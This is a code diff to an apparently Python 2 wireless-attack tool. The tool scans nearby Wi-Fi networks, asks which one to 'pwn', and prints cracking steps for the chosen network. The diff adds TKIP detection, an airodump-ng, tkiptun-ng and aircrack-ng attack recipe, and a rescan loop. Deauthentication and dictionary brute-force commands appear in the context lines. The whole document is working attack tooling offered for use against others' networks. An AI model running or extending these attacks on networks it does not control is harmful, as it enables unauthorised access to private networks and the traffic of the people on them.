@@ -140,6 +140,22 @@ aireplay-ng -0 1 -a BSSID -c CLIENT INTERFACE
 == Brute Force ==
 cat /usr/share/dict/* | aircrack-ng -w - -b BSSID psk*.cap
 """
+		if "(TKIP)" in network["Encryption"]:
+			instructions += """
+
+---------
+
+Instead of brute forcing it, because this AP supports TKIP, there are possibilities of RC4 vulnerabilities.
+
+=== Capture IVs ==
+airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE
+
+=== TKIP Relay ===
+tkiptun-ng -h MAC -a BSSID -m 80 -n 100 INTERFACE
+
+== Analyze ==
+aircrack-ng -z -b BSSID output*.cap
+"""
 	else:
 		instructions = "Wrong encryption type"
 
@@ -165,7 +181,10 @@ def get_encryption(cell):
 	if matching_line(cell, "Encryption key:") == "off":
 		enc = "Open"
 	else:
+		tkip = False
 		for line in cell:
+			if "Pairwise Ciphers (1) : TKIP" in line:
+				tkip = True
 			matching = match(line, "IE:")
 			if matching != None:
 				wpa = match(matching, "WPA")
@@ -177,6 +196,8 @@ def get_encryption(cell):
 						enc = "WPA2"
 		if enc == "":
 			enc = "WEP"
+		if tkip:
+			enc += " (TKIP)"
 	return enc
 
 def get_address(cell):
@@ -261,40 +282,42 @@ def main():
 	if os.getuid() != 0:
 		print "You must be root."
 		return
-
-	print "[+] Scanning..."
-	proc = subprocess.Popen(["iwlist", sys.argv[1], "scanning"], stdout=subprocess.PIPE)
-	cells=[[]]
-	parsed_cells=[]
-	for line in proc.stdout:
-		cell_line = match(line, "Cell ")
-		if cell_line != None:
-			cells.append([])
-			line = cell_line[-27:]
-		cells[-1].append(line.rstrip())
-	cells = cells[1:]
-	for cell in cells:
-		parsed_cells.append(parse_cell(cell))
-	sort_cells(parsed_cells)
-	encrypted_cells = []
-	for cell in parsed_cells:
-		if cell["Encryption"] != "Open":
-			encrypted_cells.append(cell)
-
-	if len(encrypted_cells) == 0:
-		print "[-] Could not find any wireless networks. Goodbye."
-		return
-
-	print_cells(encrypted_cells)
-	print
-	try:
-		network = int(raw_input("Which network would you like to pwn? [1-%s] " % len(encrypted_cells))) 
-	except:
-		network = -1
+	while True:
+		print "[+] Scanning..."
+		proc = subprocess.Popen(["iwlist", sys.argv[1], "scanning"], stdout=subprocess.PIPE)
+		cells=[[]]
+		parsed_cells=[]
+		for line in proc.stdout:
+			cell_line = match(line, "Cell ")
+			if cell_line != None:
+				cells.append([])
+				line = cell_line[-27:]
+			cells[-1].append(line.rstrip())
+		cells = cells[1:]
+		for cell in cells:
+			parsed_cells.append(parse_cell(cell))
+		sort_cells(parsed_cells)
+		encrypted_cells = []
+		for cell in parsed_cells:
+			if cell["Encryption"] != "Open":
+				encrypted_cells.append(cell)
 	
-	if network > len(encrypted_cells) or network < 1:
+		if len(encrypted_cells) == 0:
+			print "[-] Could not find any wireless networks."
+			time.sleep(2)
+			continue
+
+		print_cells(encrypted_cells)
+		print
+		try:
+			network = int(raw_input("Which network would you like to pwn? [1-%s] [0 to rescan, -1 to quit] " % len(encrypted_cells))) 
+		except:
+			network = -1
+		if network > len(encrypted_cells) or network < 0:
+			return
+		if network == 0:
+			continue
+		pwn(sys.argv[1], encrypted_cells[network - 1])
 		return
-	
-	pwn(sys.argv[1], encrypted_cells[network - 1])
 	
 main()
